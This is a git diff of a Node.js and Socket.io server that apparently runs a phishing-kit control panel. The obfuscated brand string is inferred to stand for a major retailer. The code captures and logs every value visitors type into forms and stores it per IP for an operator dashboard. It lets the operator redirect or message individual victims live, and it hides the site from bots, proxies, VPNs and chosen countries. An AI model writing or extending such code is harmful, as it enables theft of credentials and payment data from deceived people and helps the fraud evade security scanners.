+      }
+      
+      // Update user connection status with accurate IP
+      trackIPStatus(data.clientIP, true, socket.id);
+      
+      // Update any existing mappings for other connections from the same client
+      for (const [key, value] of accurateClientIPs.entries()) {
+        if (value.clientIP === data.clientIP && key !== socketIP) {
+          console.log(`Updating existing mapping for ${key} to use ipify.org source`);
+          value.source = isFromIpify ? 'ipify.org' : value.source;
+          accurateClientIPs.set(key, value);
+        }
+      }
+    }
+  });
 
   // Handle input data from clients
   socket.on('input-data', (data) => {
-    if (!data || !data.ip) return;
-
-    // Store input data in cache
-    if (!inputDataCache.has(data.ip)) {
-      inputDataCache.set(data.ip, []);
+    if (!data || !data.clientIP) return;
+    
+    // Use the client IP from the data, which should be the most accurate
+    const clientIP = data.clientIP;
+    const source = data.source || 'unknown';
+    const isFromIpify = source.includes('ipify');
+    
+    // Validate the client IP
+    if (!isValidPublicIP(clientIP)) {
+      console.warn(`Received invalid client IP in input data: ${clientIP}`);
+      return;
+    }
+    
+    // If this is from ipify.org, update the accurate client IP mapping
+    if (isFromIpify) {
+      // Store mapping between socket IP and accurate client IP
+      accurateClientIPs.set(socketIP, {
+        clientIP: clientIP,
+        timestamp: new Date().toISOString(),
+        source: 'ipify.org',
+        socketId: socket.id
+      });
+    }
+    
+    // Create a standardized input data object with property names matching what the dashboard expects
+    const inputDataForCache = {
+      ip: clientIP,
+      path: data.path || '/',
+      inputName: data.name,
+      inputType: data.type,
+      inputValue: data.value,
+      timestamp: data.timestamp || new Date().toISOString(),
+      source: source
+    };
+    
+    // Store input data in cache using the accurate client IP
+    if (!inputDataCache.has(clientIP)) {
+      inputDataCache.set(clientIP, []);
     }
 
-    const inputDataArray = inputDataCache.get(data.ip);
-    inputDataArray.push(data);
+    const inputDataArray = inputDataCache.get(clientIP);
+    
+    // Check for duplicates before adding new input data
+    // Consider input as duplicate if it has the same name, type, value and was submitted within 2 seconds
+    const isDuplicate = inputDataArray.some(existingInput => {
+      const sameInputName = existingInput.inputName === inputDataForCache.inputName || 
+                           (existingInput.name === inputDataForCache.inputName);
+      const sameInputType = existingInput.inputType === inputDataForCache.inputType || 
+                           (existingInput.type === inputDataForCache.inputType);
+      const sameInputValue = existingInput.inputValue === inputDataForCache.inputValue || 
+                           (existingInput.value === inputDataForCache.inputValue);
+      
+      // Check if timestamps are within 2 seconds of each other
+      const existingTime = new Date(existingInput.timestamp).getTime();
+      const newTime = new Date(inputDataForCache.timestamp).getTime();
+      const timeWithinThreshold = Math.abs(existingTime - newTime) < 2000; // 2 seconds threshold
+      
+      return sameInputName && sameInputType && sameInputValue && timeWithinThreshold;
+    });
+    
+    // Only add if not a duplicate
+    if (!isDuplicate) {
+      inputDataArray.push(inputDataForCache);
+      console.log('New input data added to cache');
+    } else {
+      console.log('Duplicate input data detected and skipped');
+    }
 
     // Limit stored input data to 50 entries per IP
     if (inputDataArray.length > 50) {
       inputDataArray.shift();
     }
 
-    // Update cache
-    inputDataCache.set(data.ip, inputDataArray);
+    // Update cache with the accurate client IP
+    inputDataCache.set(clientIP, inputDataArray);
 
-    // Check for suspicious activity
-    const suspiciousActivity = detectSuspiciousActivity(data);
-
-    if (suspiciousActivity) {
-      // Get visitor data
-      const visitorData = ipCache.get(data.ip);
-
-      if (visitorData) {
-        // Initialize suspiciousActivities array if it doesn't exist
-        if (!visitorData.suspiciousActivities) {
-          visitorData.suspiciousActivities = [];
-        }
-
-        // Add suspicious activity with timestamp and input data
-        const activityEntry = {
-          type: suspiciousActivity.type,
-          details: suspiciousActivity.details,
-          timestamp: new Date().toISOString(),
-          inputData: {
-            path: data.path || '',
-            inputName: data.inputName || '',
-            inputType: data.inputType || ''
-          }
-        };
-
-        // Add to beginning of array (most recent first)
-        visitorData.suspiciousActivities.unshift(activityEntry);
-
-        // Limit to 20 most recent suspicious activities
-        if (visitorData.suspiciousActivities.length > 20) {
-          visitorData.suspiciousActivities = visitorData.suspiciousActivities.slice(0, 20);
-        }
-
-        // Update visitor data in cache
-        ipCache.set(data.ip, visitorData);
-
-        // // Emit suspicious activity event to all dashboard clients
-        // io.emit('suspicious-activity', {
-        //   ip: data.ip,
-        //   activity: activityEntry,
-        //   visitorData: {
-        //     country: visitorData.country || 'Unknown',
-        //     countryCode: visitorData.countryCode || 'XX',
-        //     city: visitorData.city || 'Unknown',
-        //     isp: visitorData.isp || 'Unknown',
-        //     isBlocked: visitorData.isBlocked || false
-        //   }
-        // });
-
-        // Update dashboard in real-time
-        io.emit('dashboard-update');
-
-        console.log(`Suspicious activity detected from ${data.ip}: ${suspiciousActivity.type} - ${suspiciousActivity.details}`);
+    // Visitor data tracking 
+    const visitorData = ipCache.get(clientIP) || ipCache.get(socketIP);
+    
+    if (visitorData) {
+      // Update the visitor data with the accurate client IP if needed
+      if (!visitorData.accurateIP || (isFromIpify && visitorData.accurateIP !== clientIP)) {
+        visitorData.accurateIP = clientIP;
+        visitorData.ipSource = isFromIpify ? 'ipify.org' : source;
+        ipCache.set(clientIP, visitorData);
       }
+      
+      // Log input data received with source information and actual input value
+      console.log(`Input data received from ${clientIP} (source: ${source}) on path ${data.path || '/'}`);
+      console.log(`Input value: "${data.value}", Type: ${data.type}, Name: ${data.name}`);
+      
+      // Update cache with the accurate client IP
+      ipCache.set(clientIP, visitorData);
     }
+    
+    // Emit dashboard update to refresh the input monitoring tab
+    io.emit('input-data-update');
   });
 
   // Handle client disconnect
   socket.on('disconnect', () => {
     console.log('Client disconnected:', socket.id);
+    
+    // Find the accurate IP associated with this socket
+    let clientIP = socketIP;
+    let foundMapping = false;
+    
+    // Search through the accurateClientIPs map to find the accurate IP for this socket
+    for (const [apparentIP, mapping] of accurateClientIPs.entries()) {
+      if (mapping.socketId === socket.id) {
+        clientIP = mapping.clientIP;
+        foundMapping = true;
+        console.log(`Found accurate IP mapping for disconnected socket: ${clientIP}`);
+        break;
+      }
+    }
+    
+    // If no mapping was found, use the socket's apparent IP
+    if (!foundMapping) {
+      console.log(`No accurate IP mapping found for disconnected socket, using apparent IP: ${socketIP}`);
+    }
+    
+    // Update the user's status to offline
+    trackIPStatus(clientIP, false, socket.id);
+    
+    // Emit dashboard update if needed
+    io.emit('dashboard-update');
+  });
+  
+  // Handle proxy detection toggle
+  socket.on('update-proxy-detection', (data) => {
+    console.log('Proxy detection update received:', data);
+    
+    if (data && typeof data.enabled === 'boolean') {
+      // Update global setting
+      globalSettings.proxyDetectionEnabled = data.enabled;
+      console.log(`Proxy detection ${data.enabled ? 'enabled' : 'disabled'} by admin`);
+      
+      // Emit confirmation to all dashboard clients
+      io.emit('proxy-detection-toggled', {
+        success: true,
+        enabled: data.enabled,
+        timestamp: Date.now()
+      });
+    }
+  });
+  
+  // Send proxy detection status on connection
+  socket.emit('proxy-detection-status', {
+    enabled: globalSettings.proxyDetectionEnabled
   });
 });
 
@@ -213,11 +1131,379 @@ let brand = "A-1M-1A-1Z-1O"; // hadi hizyada;
 brand = brand.split("-1");
 brand = brand.join("");
 
+// Add JSON middleware to parse request bodies
+app.use(express.json());
 
+// Dashboard routes
+app.get('/dashboard/country-filters', (req, res) => {
+  res.json(countryFilterSettings);
+});
 
+app.post('/dashboard/redirect-ip', (req, res) => {
+  const { ip, redirectUrl, isPermanent } = req.body;
+  
+  if (!ip || !redirectUrl) {
+    return res.status(400).json({ success: false, error: 'Missing required parameters' });
+  }
+  
+  // Store the redirect settings for this IP
+  ipRedirectSettings.set(ip, {
+    redirectUrl,
+    isPermanent: isPermanent || false,
+    createdAt: new Date().toISOString()
+  });
+  
+  console.log(`IP ${ip} will be redirected to ${redirectUrl} (${isPermanent ? 'permanent' : 'temporary'})`);
+  
+  // Emit event to notify all clients
+  io.emit('ip-redirect-update', { ip, redirectUrl });
+  
+  res.json({ success: true });
+});
 
-// PORT:
-const PORT = process.env.PORT || 5000
+app.post('/dashboard/country-filters', (req, res) => {
+  const { mode, country, action } = req.body;
+  
+  // Update filter mode if provided
+  if (mode && (mode === 'block' || mode === 'allow')) {
+    countryFilterSettings.mode = mode;
+  }
+  
+  // Add or remove country if provided
+  if (country && action) {
+    if (action === 'add') {
+      if (mode === 'block' && !countryFilterSettings.blockedCountries.includes(country)) {
+        countryFilterSettings.blockedCountries.push(country);
+      } else if (mode === 'allow' && !countryFilterSettings.allowedCountries.includes(country)) {
+        countryFilterSettings.allowedCountries.push(country);
+      }
+    } else if (action === 'remove') {
+      if (mode === 'block') {
+        countryFilterSettings.blockedCountries = countryFilterSettings.blockedCountries.filter(c => c !== country);
+      } else if (mode === 'allow') {
+        countryFilterSettings.allowedCountries = countryFilterSettings.allowedCountries.filter(c => c !== country);
+      }
+    }
+  }
+  
+  // Emit update to all connected clients
+  io.emit('country-filter-update', countryFilterSettings);
+  
+  res.json({ success: true, settings: countryFilterSettings });
+});
+
+// Endpoint to send messages to clients
+app.post('/dashboard/send-message', (req, res) => {
+  const { message, type, title, duration, targetIP } = req.body;
+  
+  if (!message) {
+    return res.status(400).json({ success: false, error: 'Message content is required' });
+  }
+  
+  // Create message object
+  const messageObj = {
+    content: message,
+    type: type || 'info',
+    duration: duration || 10
+  };
+  
+  // Add title if provided
+  if (title) {
+    messageObj.title = title;
+  }
+  
+  // Require a target IP - no more broadcasting to all clients
+  if (!targetIP) {
+    return res.status(400).json({ success: false, error: 'Target IP is required' });
+  }
+  
+  console.log(`Sending message to client: ${targetIP}:`, messageObj);
+  
+  // Find sockets associated with this IP
+  // Use a Set to ensure we only have unique socket IDs
+  const uniqueSocketIds = new Set();
+  for (const [apparentIP, mapping] of accurateClientIPs.entries()) {
+    if (mapping.clientIP === targetIP) {
+      uniqueSocketIds.add(mapping.socketId);
+    }
+  }
+  
+  const socketIds = Array.from(uniqueSocketIds);
+  
+  if (socketIds.length > 0) {
+    // Send message to each unique socket (only once per socket)
+    socketIds.forEach(socketId => {
+      io.to(socketId).emit('client-message', messageObj);
+    });
+    res.json({ success: true, recipients: socketIds.length });
+  } else {
+    res.status(404).json({ success: false, error: 'No active connections found for this IP' });
+  }
+});
+
+// Endpoint to get details for a specific IP address
+app.get('/dashboard/ip/:ip', (req, res) => {
+  const ip = req.params.ip;
+  
+  if (!ip) {
+    return res.status(400).json({ error: 'IP address is required' });
+  }
+  
+  // Find visitor data for this IP
+  const visitorData = ipCache.get(ip);
+  
+  if (!visitorData) {
+    return res.status(404).json({ error: 'IP not found' });
+  }
+  
+  // Check if this IP has a redirect setting
+  const hasRedirect = ipRedirectSettings.has(ip);
+  const redirectInfo = hasRedirect ? ipRedirectSettings.get(ip) : null;
+  
+  // Calculate additional metrics
+  const firstSeen = visitorData.firstSeen ? new Date(visitorData.firstSeen) : new Date();
+  const lastSeen = visitorData.lastRequest ? new Date(visitorData.lastRequest) : 
+                   visitorData.lastSeen ? new Date(visitorData.lastSeen) : new Date();
+  const sessionDuration = lastSeen - firstSeen;
+  const now = new Date();
+  const minutesSinceLastSeen = Math.floor((now - lastSeen) / 60000);
+  
+  // Extract and analyze headers if available
+  const headers = visitorData.headers || {};
+  const acceptLanguage = headers['accept-language'] || '';
+  const languages = acceptLanguage.split(',').map(lang => lang.trim().split(';')[0]);
+  const primaryLanguage = languages[0] || 'Unknown';
+  
+  // Analyze referrer if available
+  const referrer = headers['referer'] || headers['referrer'] || '';
+  let referrerSource = 'Direct';
+  let referrerDomain = '';
+  
+  if (referrer) {
+    try {
+      const referrerUrl = new URL(referrer);
+      referrerDomain = referrerUrl.hostname;
+      
+      // Identify common referrer sources
+      if (referrerDomain.includes('google')) {
+        referrerSource = 'Google';
+      } else if (referrerDomain.includes('facebook')) {
+        referrerSource = 'Facebook';
+      } else if (referrerDomain.includes('twitter') || referrerDomain.includes('x.com')) {
+        referrerSource = 'Twitter';
+      } else if (referrerDomain.includes('instagram')) {
+        referrerSource = 'Instagram';
+      } else if (referrerDomain.includes('linkedin')) {
+        referrerSource = 'LinkedIn';
+      } else if (referrerDomain.includes('bing')) {
+        referrerSource = 'Bing';
+      } else if (referrerDomain.includes('yahoo')) {
+        referrerSource = 'Yahoo';
+      } else {
+        referrerSource = 'External Website';
+      }
+    } catch (e) {
+      // Invalid URL format
+      referrerSource = 'Unknown';
+    }
+  }
+  
+  // Return detailed information about this IP
+  res.json({
+    // Basic IP information
+    ip: visitorData.ip,
+    country: visitorData.country,
+    countryCode: visitorData.countryCode?.toLowerCase(),
+    city: visitorData.city || '',
+    region: visitorData.regionName || '',
+    timezone: visitorData.timezone || '',
+    isp: visitorData.isp || '',
+    org: visitorData.org || '',
+    ipSource: visitorData.ipSource || 'unknown',
+    
+    // Redirect information
+    hasRedirect: hasRedirect,
+    redirectUrl: redirectInfo ? redirectInfo.redirectUrl : null,
+    redirectType: redirectInfo ? (redirectInfo.isPermanent ? 'permanent' : 'temporary') : null,
+    
+    // Status information
+    lastSeen: visitorData.lastRequest || visitorData.lastSeen,
+    isOnline: visitorData.isOnline || false,
+    isBot: visitorData.isBot || false,
+    isProxy: visitorData.proxy || false,
+    isBlocked: false, // Implement based on your blocking logic
+    
+    // Device and browser information
+    userAgent: visitorData.userAgent,
+    browser: visitorData.browser,
+    os: visitorData.os,
+    device: visitorData.device,
+    
+    // Visit statistics
+    visits: visitorData.visits || 1,
+    firstSeen: visitorData.firstSeen,
+    sessionDuration: sessionDuration,
+    minutesSinceLastSeen: minutesSinceLastSeen,
+    
+    // Header information
+    headers: visitorData.headers || {},
+    acceptLanguage: acceptLanguage,
+    primaryLanguage: primaryLanguage,
+    languages: languages,
+    
+    // Referrer information
+    referrer: referrer,
+    referrerSource: referrerSource,
+    referrerDomain: referrerDomain,
+    
+    // Additional technical details
+    latitude: visitorData.lat,
+    longitude: visitorData.lon,
+    zipCode: visitorData.zip,
+    asn: visitorData.as,
+    mobile: visitorData.mobile || false,
+    hostName: visitorData.reverse || '',
+    
+    // Page view information
+    currentPage: visitorData.currentPage || '/',
+    landingPage: visitorData.landingPage || '/',
+    pagesViewed: visitorData.pagesViewed || []
+  });
+});
+
+// IP Redirect endpoint to set redirect for specific IPs
+app.post('/dashboard/redirect', (req, res) => {
+  const { ip, redirectUrl, isPermanent } = req.body;
+  
+  if (!ip || !redirectUrl) {
+    return res.status(400).json({ success: false, error: 'IP and redirect URL are required' });
+  }
+  
+  // Ensure URL has protocol
+  let finalUrl = redirectUrl;
+  if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
+    finalUrl = 'https://' + finalUrl;
+  }
+  
+  // Save the redirect setting
+  ipRedirectSettings.set(ip, {
+    redirectUrl: finalUrl,
+    isPermanent: isPermanent === true
+  });
+  
+  console.log(`Set redirect for IP ${ip} to ${finalUrl} (${isPermanent ? 'permanent' : 'temporary'})`);
+  
+  res.json({ success: true });
+});
+
+// Remove IP redirect endpoint
+app.post('/dashboard/remove-redirect', (req, res) => {
+  const { ip } = req.body;
+  
+  if (!ip) {
+    return res.status(400).json({ success: false, error: 'IP is required' });
+  }
+  
+  // Remove the redirect setting if it exists
+  if (ipRedirectSettings.has(ip)) {
+    ipRedirectSettings.delete(ip);
+    console.log(`Removed redirect for IP ${ip}`);
+    res.json({ success: true });
+  } else {
+    res.json({ success: false, error: 'No redirect found for this IP' });
+  }
+});
+
+// GET endpoint for input data for a specific IP
+app.get('/dashboard/input-data/:ip', (req, res) => {
+  const ip = req.params.ip;
+  
+  if (!ip) {
+    return res.status(400).json({ success: false, error: 'IP parameter is required' });
+  }
+  
+  // Get input data for this IP
+  const inputData = inputDataByIP.get(ip) || [];
+  
+  // Return the input data
+  res.json({
+    success: true,
+    ip: ip,
+    inputData: inputData
+  });
+});
+
+// DELETE endpoint to clear input data for a specific IP
+app.delete('/dashboard/input-data/:ip', (req, res) => {
+  const ip = req.params.ip;
+  
+  if (!ip) {
+    return res.status(400).json({ success: false, error: 'IP parameter is required' });
+  }
+  
+  // Check if there's data to delete
+  if (!inputDataByIP.has(ip)) {
+    return res.status(404).json({ success: false, error: 'No input data found for this IP' });
+  }
+  
+  // Delete input data for this IP
+  inputDataByIP.delete(ip);
+  
+  console.log(`Deleted input data cache for IP ${ip}`);
+  
+  // Return success
+  res.json({
+    success: true,
+    message: `Input data for IP ${ip} has been deleted`
+  });
+});
+
+app.get('/dashboard/visitors', (req, res) => {
+  // Convert visitor data to array format for the dashboard
+  const visitors = Array.from(ipCache.entries()).map(([ip, visitor]) => {
+    // Check if this IP has a redirect setting
+    const hasRedirect = ipRedirectSettings.has(ip);
+    const redirectInfo = hasRedirect ? ipRedirectSettings.get(ip) : null;
+    
+    // Ensure IP is always included
+    return {
+      ip: ip || visitor.ip || 'unknown',
+      country: visitor.country,
+      countryCode: visitor.countryCode?.toLowerCase(),
+      city: visitor.city || '',
+      region: visitor.regionName || '',
+      isp: visitor.isp || '',
+      lastSeen: visitor.lastRequest || visitor.lastSeen,
+      firstSeen: visitor.firstSeen || visitor.lastSeen,
+      isOnline: visitor.isOnline || false,
+      isBot: visitor.isBot || false,
+      isProxy: visitor.proxy || false,
+      isBlocked: false, // You can implement this based on your blocking logic
+      userAgent: visitor.userAgent,
+      browser: visitor.browser || '',
+      os: visitor.os || '',
+      device: visitor.device || '',
+      visits: visitor.visits || 1,
+      ipSource: visitor.ipSource || 'unknown',
+      hasRedirect: hasRedirect,
+      redirectUrl: redirectInfo ? redirectInfo.redirectUrl : null,
+      redirectType: redirectInfo ? (redirectInfo.isPermanent ? 'permanent' : 'temporary') : null
+    };
+  });
+  
+  // Calculate stats
+  const stats = {
+    totalVisitors: visitors.length,
+    botsDetected: visitors.filter(v => v.isBot).length,
+    proxyCount: visitors.filter(v => v.isProxy).length,
+    blockedCount: 0 // Implement this based on your blocking logic
+  };
+  
+  res.json({ visitors, stats });
+});
+
+// PORT - defined at the top level to avoid duplicate declarations
+let PORT = process.env.PORT || 5000
 
 //use:
 app.use(session({
@@ -234,17 +1520,16 @@ app.use(express.json());
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-
-
 //set:
 app.set('view engine', 'ejs');
 
-
-
 /////////////////[FUNCTION]//(blocker)//////////////
 
-// Create a Map to store IP data
-const ipCache = new Map();
+// Maps for tracking data
+const ipCache = new Map(); // Store IP data and status (online/offline)
+const geoDataCache = new Map(); // Store geo data to reduce API calls
+const visitorData = new Map(); // Store visitor data
+const accurateClientIPs = new Map(); // Store accurate client IPs from tracker.js
 
 // Create a Map to store input data
 const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
@@ -252,13 +1537,11 @@ const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
 // Track active sockets by IP address
 const activeSocketsByIP = new Map(); // Key: IP, Value: Set of socket IDs
 
-const globalSettings = {
-  proxyDetectionEnabled: false,
-  blockedCountries: [],
-  allowedCountries: [],
-  countryFilterMode: 'block', // 'block' or 'allow-only'
-  countryRedirectUrl: redirectURL || 'https://google.com' // Default redirect URL for country filtering
-};
+// Global settings already defined above
+
+// Our enhanced IP blocking functions are defined above
+
+// IP blocking functions are defined above
 
 // Parse User Agent function
 function parseUserAgent(userAgent) {
@@ -311,6 +1594,8 @@ const REAL_ROUTES = [
 ];
 
 // Helper functions for visitor tracking
+// Note: isLocalIP function is already defined above, using that implementation instead
+/* Original code was:
 const isLocalIP = (ip) => {
   return ip === '127.0.0.1' ||
     ip === 'localhost' ||
@@ -328,6 +1613,7 @@ const isLocalIP = (ip) => {
     ip.startsWith('fc00:') || // Unique local addresses
     ip.startsWith('fd');
 };
+*/
 
 const isSystemPath = (path) => {
   return path.startsWith('/dashboard') ||
@@ -341,7 +1627,12 @@ const isSystemPath = (path) => {
     path.startsWith('/favicon');
 };
 
-// Function to emit redirect events to specific IP addresses
+/**
+ * Function to emit redirect events to specific IP addresses
+ * @param {string} ip - The IP address to redirect
+ * @param {string} url - The URL to redirect to
+ * @returns {boolean} - Whether the redirect was sent successfully
+ */
 const emitRedirect = (ip, url) => {
   console.log(`Attempting to redirect IP ${ip} to ${url}`);
   
@@ -363,7 +1654,7 @@ const emitRedirect = (ip, url) => {
       // Send redirect event to all active sockets with this IP
       socketObjects.forEach(socket => {
         console.log(`Sending redirect to socket ${socket.id} for IP ${ip}`);
-        socket.emit('redirect', { url });
+        socket.emit('redirect', { ip, url });
       });
       return true;
     }
@@ -373,8 +1664,7 @@ const emitRedirect = (ip, url) => {
   return false;
 };
 
-// Geo data cache to reduce API calls
-const geoDataCache = new Map();
+// Using the geoDataCache defined above
 
 // Helper function to get geolocation data with caching
 async function getGeoData(ip) {
@@ -415,28 +1705,141 @@ async function getGeoData(ip) {
   return { country: 'Unknown', countryCode: 'XX', city: 'Unknown' };
 }
 
-// Get accurate client IP from various headers
+// Function to get the most accurate client IP available
 function getAccurateClientIp(req) {
-  // Check for client-provided IP from tracker.js
-  if (req.body && req.body.clientIP) {
+  // First check if we have a stored accurate IP for this apparent IP
+  const apparentIp = req.ip || req.connection.remoteAddress;
+  
+  // Helper function to validate if an IP is a public IP (not local/private)
+  function isValidPublicIP(ip) {
+    if (!ip) return false;
+    
+    // Check if it's a valid IP format
+    const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
+    if (!ipRegex.test(ip)) return false;
+    
+    // Check if it's not a local/private IP
+    const parts = ip.split('.');
+    const firstOctet = parseInt(parts[0], 10);
+    const secondOctet = parseInt(parts[1], 10);
+    
+    // Filter out local IPs
+    if (ip === '127.0.0.1') return false;
+    if (firstOctet === 10) return false; // 10.0.0.0/8
+    if (firstOctet === 172 && secondOctet >= 16 && secondOctet <= 31) return false; // 172.16.0.0/12
+    if (firstOctet === 192 && secondOctet === 168) return false; // 192.168.0.0/16
+    if (firstOctet === 169 && secondOctet === 254) return false; // 169.254.0.0/16 (APIPA)
+    if (ip === '0.0.0.0') return false;
+    if (ip.startsWith('::1') || ip.startsWith('fe80:') || ip.startsWith('fc00:')) return false; // IPv6 local
+    
+    return true;
+  }
+  
+  // PRIORITY 1: Check for client-provided IP from ipify.org via tracker.js in current request
+  // This is the most reliable source as it comes from ipify.org through the client
+  if (req.body && req.body.clientIP && req.body.source === 'ipify.org' && isValidPublicIP(req.body.clientIP)) {
+    console.log('Using client IP from ipify.org via tracker.js:', req.body.clientIP);
+    // Store this mapping for future requests
+    accurateClientIPs.set(apparentIp, {
+      clientIP: req.body.clientIP,
+      timestamp: new Date().toISOString(),
+      source: 'ipify.org'
+    });
     return req.body.clientIP;
   }
+  
+  // PRIORITY 2: Check for any client-provided IP from tracker.js in current request
+  if (req.body && req.body.clientIP && isValidPublicIP(req.body.clientIP)) {
+    console.log('Using client IP from tracker.js POST data:', req.body.clientIP);
+    // Store this mapping for future requests
+    accurateClientIPs.set(apparentIp, {
+      clientIP: req.body.clientIP,
+      timestamp: new Date().toISOString(),
+      source: req.body.source || 'post-data'
+    });
+    return req.body.clientIP;
+  }
+  
+  // PRIORITY 2: Check if we have a stored accurate IP from tracker.js
+  if (apparentIp && accurateClientIPs.has(apparentIp)) {
+    const accurateIPData = accurateClientIPs.get(apparentIp);
+    // Only use if it's relatively fresh (within last 24 hours)
+    const timestamp = new Date(accurateIPData.timestamp);
+    const now = new Date();
+    const hoursSinceUpdate = (now - timestamp) / (1000 * 60 * 60);
+    
+    if (hoursSinceUpdate < 24 && isValidPublicIP(accurateIPData.clientIP)) {
+      console.log(`Using accurate IP from tracker.js mapping: ${apparentIp} -> ${accurateIPData.clientIP}`);
+      return accurateIPData.clientIP;
+    } else if (hoursSinceUpdate >= 24) {
+      console.log(`Mapping expired for ${apparentIp}, removing from cache`);
+      accurateClientIPs.delete(apparentIp);
+    }
+  }
+  
+  // PRIORITY 3: For socket.io connections, check query parameters with source information
+  if (req.query && req.query.clientIP && isValidPublicIP(req.query.clientIP)) {
+    const source = req.query.clientIPSource || 'query-param';
+    console.log(`Using client IP from query parameters (source: ${source}):`, req.query.clientIP);
+    
+    // Prioritize ipify.org source
+    const isFromIpify = source.includes('ipify');
+    
+    // Store this mapping for future requests
+    accurateClientIPs.set(apparentIp, {
+      clientIP: req.query.clientIP,
+      timestamp: new Date().toISOString(),
+      source: isFromIpify ? 'ipify.org' : source
+    });
+    return req.query.clientIP;
+  }
+  
+  // PRIORITY 4: Check socket.io handshake if available
+  if (req.handshake && req.handshake.query && req.handshake.query.clientIP && 
+      isValidPublicIP(req.handshake.query.clientIP)) {
+    console.log('Using client IP from socket handshake:', req.handshake.query.clientIP);
+    // Store this mapping for future requests
+    accurateClientIPs.set(apparentIp, {
+      clientIP: req.handshake.query.clientIP,
+      timestamp: new Date().toISOString(),
+      source: 'socket-handshake'
+    });
+    return req.handshake.query.clientIP;
+  }
 
-  // Check for X-Forwarded-For header (common with proxies)
-  const xForwardedFor = req.headers['x-forwarded-for'];
+  // PRIORITY 5: Check for X-Forwarded-For header (common with proxies)
+  const xForwardedFor = req.headers && req.headers['x-forwarded-for'];
   if (xForwardedFor) {
     // Get the first IP in the list which is typically the client's true IP
-    return xForwardedFor.split(',')[0].trim();
+    const ip = xForwardedFor.split(',')[0].trim();
+    if (isValidPublicIP(ip)) {
+      console.log('Using IP from X-Forwarded-For header:', ip);
+      return ip;
+    }
   }
 
-  // Check for other common headers
-  const xRealIp = req.headers['x-real-ip'];
-  if (xRealIp) {
+  // PRIORITY 6: Check for other common headers
+  const xRealIp = req.headers && req.headers['x-real-ip'];
+  if (xRealIp && isValidPublicIP(xRealIp)) {
+    console.log('Using IP from X-Real-IP header:', xRealIp);
     return xRealIp;
   }
-
-  // Fall back to request-ip library
-  return requestIp.getClientIp(req);
+  
+  // PRIORITY 7: Use the apparent IP if it's a valid public IP
+  if (apparentIp && isValidPublicIP(apparentIp)) {
+    console.log('Using apparent IP from request:', apparentIp);
+    return apparentIp;
+  }
+  
+  // FALLBACK: If all else fails and we have an apparent IP, use it even if it might be local
+  if (apparentIp) {
+    console.log('Using apparent IP as fallback (might be local):', apparentIp);
+    return apparentIp;
+  }
+  
+  // Ultimate fallback
+  console.log('Could not determine client IP, using default');
+  return '0.0.0.0';
 }
 
 // Bot detection function
@@ -727,27 +2130,28 @@ function parseUserAgent(userAgent) {
       break;
     }
   }
+}
 
-    path.startsWith('/js') ||
-    path.startsWith('/img') ||
-    path.startsWith('/favicon');
-};
+// Using the isSystemPath function defined earlier
 
-
-
-// Visitor tracking middleware - add this before other middleware
+// Middleware for visitor detection and tracking
 async function detectMiddleware(req, res, next) {
-  // Get accurate client IP with fallbacks
-  const clientIp = getAccurateClientIp(req);
-
-  // Skip tracking for non-target routes or local IPs
-  if (!REAL_ROUTES.includes(req.path) || isLocalIP(clientIp) || isSystemPath(req.path)) {
-    return next();
-  }
-
-  // Performance optimization: Start the IP API request early
-  let ipInfoPromise;
-  if (!ipCache.has(clientIp)) {
+  try {
+    // 1. Get accurate client IP from tracker.js or fallback methods
+    const clientIp = getAccurateClientIp(req);
+    if (!clientIp) {
+      console.error('Failed to determine client IP');
+      return next();
+    }
+    
+    // Skip tracking for non-target routes or local IPs
+    if (!REAL_ROUTES.includes(req.path) || isLocalIP(clientIp) || isSystemPath(req.path)) {
+      return next();
+    }
+    
+    // Performance optimization: Start the IP API request early
+    let ipInfoPromise;
+    if (!ipCache.has(clientIp)) {
     ipInfoPromise = axios.get(`http://ip-api.com/json/${clientIp}?fields=66842623`)
       .catch(error => {
         console.error(`Error fetching IP data for ${clientIp}:`, error.message);
@@ -859,48 +2263,60 @@ async function detectMiddleware(req, res, next) {
       return res.redirect(targetUrl);
     }
 
-    // 3. Check for proxy/VPN if enabled
-    if (globalSettings.proxyDetectionEnabled) {
-      if (visitorData.proxy || visitorData.hosting) {
-        console.log(`🔒 Proxy/VPN detected (from cache): ${clientIp} on path ${req.path}`);
+    // 3. Check for proxy/VPN only if detection is enabled
+    if (visitorData.proxy || visitorData.hosting) {
+      console.log(`🔒 Proxy/VPN detected (from cache): ${clientIp} on path ${req.path}`);
+      
+      // Only redirect if proxy detection is enabled
+      if (globalSettings.proxyDetectionEnabled) {
+        console.log(`VPN|PROXY: ON - Redirecting to ${targetUrl}`);
         return res.redirect(targetUrl);
+      } else {
+        console.log(`VPN|PROXY: OFF - Allowing access despite proxy detection`);
       }
+    } else {
+      // Only perform secondary proxy check if primary didn't detect and proxy detection is enabled
+      if (globalSettings.proxyDetectionEnabled) {
+        const isProxyDetected = await isProxy(clientIp, req);
+        if (isProxyDetected) {
+          // Update cache with proxy detection
+          visitorData.proxy = true;
+          ipCache.set(clientIp, visitorData);
 
-      // Only perform secondary proxy check if primary didn't detect
-      const isProxyDetected = await isProxy(clientIp, req);
-      if (isProxyDetected) {
-        // Update cache with proxy detection
-        visitorData.proxy = true;
-        ipCache.set(clientIp, visitorData);
-
-        console.log(`🔒 Proxy/VPN detected (secondary check): ${clientIp} on path ${req.path}`);
-        return res.redirect(targetUrl);
+          console.log(`🔒 Proxy/VPN detected (secondary check): ${clientIp} on path ${req.path}`);
+          console.log(`VPN|PROXY: ON - Redirecting to ${targetUrl}`);
+          return res.redirect(targetUrl);
+        }
       }
     }
 
     // 4. Country filtering logic
-    const countryCode = visitorData.country || visitorData.countryCode;
+    const countryCode = visitorData.countryCode || (visitorData.country ? visitorData.country.substring(0, 2) : null);
     const formattedCountryCode = countryCode ? countryCode.toUpperCase() : null;
-
-    // Apply country filtering based on mode
-    if (globalSettings.countryFilterMode === 'block') {
-      // Block mode: block countries in the list
-      if (formattedCountryCode &&
-        globalSettings.blockedCountries &&
-        globalSettings.blockedCountries.includes(formattedCountryCode)) {
+    
+    // Use the isCountryAllowed function to determine if access should be allowed
+    if (formattedCountryCode && !isCountryAllowed(formattedCountryCode)) {
+      // Get the appropriate redirect URL (either custom or default)
+      const redirectTarget = globalSettings.countryRedirectUrl || targetUrl;
+      
+      if (globalSettings.countryFilterMode === 'block') {
